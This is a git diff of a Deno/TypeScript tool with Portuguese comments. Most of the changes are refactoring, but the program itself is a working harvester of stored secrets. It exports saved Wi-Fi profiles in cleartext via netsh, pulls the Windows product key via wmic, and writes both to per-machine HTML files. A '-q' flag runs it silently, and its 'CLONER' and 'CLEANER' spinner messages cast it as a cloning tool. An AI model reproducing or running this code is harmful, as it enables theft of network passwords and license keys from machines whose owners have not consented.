@@ -1,37 +1,35 @@
+import {
+	checkDirs,
+	clearTags,
+	createHTML,
+	getNow,
+	random,
+} from './Functions.ts';
 import { SpinnerTypes, TerminalSpinner } from '@spinners';
 import { keypress } from '@cliffy/keypress';
-import { DateTime } from '@luxon';
 import { qrcode } from '@qrcode';
 import { delay } from '@std';
 import colors from '@colors';
 import $ from '@dax';
 
-// Logs e delays ativados
-let showLogs = Deno.args.includes('-q') ? false : true;
-let winLKey: string;
-let counter = 0;
+let showLogs = !Deno.args.includes('-q');
+let key: string; // Windows License Key
+let c = 0; // network counter
 colors;
 
 // Função intermediária para delay();
-const sleep = (timeout: number) => showLogs ? delay(timeout) : null;
-const random = (min = 500, max = 2_500) =>
-	Math.floor(Math.random() * (max - min) + min);
-
-const getTimestamp = () =>
-	DateTime.now()
-		.setLocale('pt')
-		.setZone('America/Sao_Paulo');
+const sleep = (timeout: number) => showLogs && delay(timeout);
 
 //  Ativa o Listener para o teclado
 silentMode();
 
-// Se não existir, nem Title terá
-await Deno.mkdir('data').catch(() => {});
+// Verifica se todas as pastas necessárias foram criadas
+await checkDirs();
 
-// Title.txt contém uma string colorida bem cringe
+// 'Title.txt' contém uma string bem cringe
 const title: string = await Deno.readTextFile('data/Title.txt')
 	.catch(() => '');
-showLogs && console.log('%c' + title, 'color: red');
+showLogs && console.log(title.text_bold.red);
 
 class Spinner {
 	sector: string;
@@ -70,10 +68,10 @@ class Spinner {
 			'[',
 			this.sector.toUpperCase().green, // [ SECTOR
 			'|',
-			getTimestamp().toFormat('T').yellow, // [ SECTOR | 18:04
+			getNow('T').yellow, // [ SECTOR | 18:04
 			'] -',
 			status ? this.text.red : this.text.cyan,
-		].join(' '); // [ SETOR | 18:04 ] - TEXT
+		].join(' ').text_bold; // [ SETOR | 18:04 ] - TEXT
 	}
 }
 
@@ -91,14 +89,8 @@ await Deno.remove('temp', { recursive: true })
 !showLogs && Deno.exit();
 
 async function NetSHProfileCollector() {
-	createFakeLogs();
 	// sem await pra exibir os logs enquanto copia os dados
-
-	// Cria pasta de arquivos temporários (se não existir)
-	await Deno.mkdir('temp').catch(() => {});
-
-	// Cria pasta de senhas (se não existir)
-	await Deno.mkdir('data/WiFiPasswords').catch(() => {});
+	createFakeLogs();
 
 	// Chama a API do Windows
 	await $`netsh wlan export profile key=clear folder=temp`.lines();
@@ -107,7 +99,7 @@ async function NetSHProfileCollector() {
 		/** Por padrão, A API fornece as informações em arquivos XML bem poluídos
 		 * Então eu fiz essa bosta aqui pra deixar só o que é realmente importante
 		 */
-		counter++;
+		c++;
 
 		// Lendo o conteúdo do arquivo
 		const content = await Deno.readTextFile(`temp/${file.name}`);
@@ -125,14 +117,10 @@ async function NetSHProfileCollector() {
 
 		// Escrevendo arquivos com as informações filtradas no diretório final
 		const body = `
-	<div>
-		SSID: ${SSID[0]}<br>
-		Data: ${
-			getTimestamp().toFormat('DDDD')
-		} (<timestamp>${getTimestamp().ts}</timestamp>)<br>
-		Autenticação: ${auth[1]}<br>
-		Senha: ${pswd[1]}
-	</div><br><br>
+		SSID: <s${SSID[0]}s>
+		Data: <s${getNow()}s> (<timestamp>${getNow(true)}</timestamp>)
+		Autenticação: ${auth[1]}
+		Senha: <s${pswd[1]}s><br>
 	<img src="${networkQR}">`;
 
 		await Deno.writeTextFile(
@@ -143,21 +131,14 @@ async function NetSHProfileCollector() {
 }
 
 async function copyWinKey() {
-	winLKey =
+	key =
 		(await $`wmic path softwarelicensingservice get OA3xOriginalProductKey`
 			.lines())[1].trim();
 
-	// Cria pasta de chaves do Windows (se não existir)
-	await Deno.mkdir('data/WindowsKeys').catch(() => {});
-
 	const body = `
-	<div>
-		Máquina: ${Deno.hostname()}<br>
-		Data: ${
-		getTimestamp().toFormat('DDDD')
-	} (<timestamp>${getTimestamp().ts}</timestamp>)<br>
-		Chave de ativação do Windows: <key>${winLKey}</key>
-	</div>`;
+	Máquina: <s${Deno.hostname()}s>
+	Data: <s${getNow()}s> (<timestamp>${getNow(true)}</timestamp>)
+	Chave de ativação do Windows: <s<key>${key}</key>s>`;
 
 	await Deno.writeTextFile(
 		`data/WindowsKeys/${Deno.hostname()}.html`,
@@ -185,41 +166,18 @@ async function createFakeLogs() {
 
 	spinner = new Spinner('Wi-Fi CLONER', 'Clonando redes Wi-Fi...');
 	await sleep(random(1_000, 3_000));
-	spinner.end(`${counter} redes clonadas.`);
+	spinner.end(`${c} redes clonadas.`.text_underscore.bg_red.white);
 
 	spinner = new Spinner('KEY CLONER', 'Obtendo chave de ativação...');
 	await sleep(random());
-	spinner.end(`Chave de ativação obtida: ${winLKey}`);
+	spinner.end(`Chave de ativação: ${key.text_underscore.bg_red.white}`);
 
 	spinner = new Spinner('CLEANER', 'Apagando registros...');
 	await sleep(random());
 	spinner.end('Registros excluídos.');
+	await sleep(random(1_500, 3_000));
 
 	showLogs && Deno.exit();
-}
-
-function createHTML(title: string, body: string) {
-	return `<!DOCTYPE html>\n<html lang="pt-BR">\n<head>
-	<meta charset="UTF-8">
-	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<title>${title}</title>
-</head>\n<body>	${body}\n</body>\n</html>
-`;
-}
-
-function clearTags(matches: IterableIterator<RegExpMatchArray>) {
-	// Regex pra filtrar as tags do XML
-	const networks: string[][] = [];
-
-	for (const match of matches) {
-		networks.push([
-			String(match[0]).replace(/<.*?>/g, ''), // nome da rede
-			match[0], // tag HTML da rede
-		]);
-	}
-
-	return networks;
 }
 
 async function silentMode() {
